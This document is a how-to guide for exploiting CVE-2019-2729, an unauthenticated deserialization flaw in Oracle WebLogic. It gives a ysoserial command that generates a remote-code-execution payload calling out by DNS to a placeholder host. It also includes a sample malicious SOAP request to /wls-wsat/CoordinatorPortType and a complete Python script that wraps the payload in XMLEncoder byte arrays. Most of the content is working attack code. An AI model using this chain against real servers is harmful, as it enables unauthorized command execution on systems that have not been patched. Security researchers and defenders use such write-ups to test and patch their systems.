
# Exploiting CVE-2019-2729 WebLogic Deserialization Vulnerability

## Introduction

CVE-2019-2729 is a Java deserialization vulnerability in Oracle WebLogic
versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0.  Serialized Java objects are
accepted anonymously via an HTTP service and deserialized.  Remote code
execution is possible without authentication.

This exploit was tested against WebLogic 10.3.6.0.

A typical vulnerable server will have HTTP services listening on one or more
TCP ports which have a web application at /wls-wsat/.

## Generate a payload with ysoserial

First, get ysoserial (https://github.com/frohoff/ysoserial) and use it to
generate a simple RCE payload.

```
java -jar ysoserial-0.0.5-all.jar Jdk7u21 "nslookup test222.ourns.example.com" > payload
```

Here, we generate a payload using ysoserial which will do a DNS lookup that
we'll be able to monitor.  The "payload" file contains a serialized Java
LinkedHashSet object which will run this command.

Note that the ysoserial payload generator used here, named Jdk7u21, only
works under JRE version 7u21 and earlier (see
https://gist.github.com/frohoff/24af7913611f8406eaf3), however that seems to
be standard with WebLogic 10.3.6.0.  You might have to use a different
payload for newer versions of WebLogic. The advantage to Jdk7u21 is the lack
of any dependancies in the server's classpath.

## Transform the payload into SOAP

Next, we need to massage this blob into a SOAP HTTP request body.  The
affected web services accept SOAP requests containing Java objects encoded
in Java's XMLEncoder format.  An example request showing the format:

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 10.0.3.8:8200
SOAPAction:
Content-Type: text/xml
Content-Length: 204219

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
 <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
   <java>
    <array method="forName">
     <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
     <void>
      <array class="byte" length="3">
       <void index="0">
        <byte>1</byte>
       </void>
       <void index="1">
        <byte>2</byte>
       </void>
       <void index="2">
        <byte>3</byte>
       </void>
      </array>
     </void>
    </array>  
   </java>
  </work:WorkContext>   
 </soapenv:Header>
 <soapenv:Body/>
</soapenv:Envelope>
```

The payload generated above needs to be stuffed into a byte[] array by the
server. The following python script will generate the required request body
and write it to a file named "payload_encoded".

```
of = open('payload_encoded','w')
payload = open('payload').read()

of.write('<?xml version="1.0" encoding="utf-8"?>\n')
of.write('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">\n')
of.write(' <soapenv:Header>\n')
of.write('  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n')
of.write('   <java>\n')
of.write('    <array method="forName">\n')
of.write('     <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>\n')
of.write('     <void>\n')
of.write('      <array class="byte" length="%d">\n' % len(payload) )

for i in range(len(payload)):
    byte = payload[i]
    v = ord(byte)
    if v >= 128:
        v = -256+v
    of.write('       <void index="%d">\n' % i)
    of.write('        <byte>%d</byte>\n' % v)
    of.write('       </void>\n')

of.write('      </array>\n')
of.write('     </void>\n')
of.write('    </array>\n')
of.write('   </java>\n')
of.write('  </work:WorkContext>\n')
of.write(' </soapenv:Header>\n')
of.write(' <soapenv:Body/>\n')
of.write('</soapenv:Envelope>\n')
```

Next, send the generated request body to the affected service via a POST
request to POST /wls-wsat/CoordinatorPortType. The entire resulting HTTP
request should look just like the example above but much longer.

The server will return a 500 response, however the command should execute
anyway.

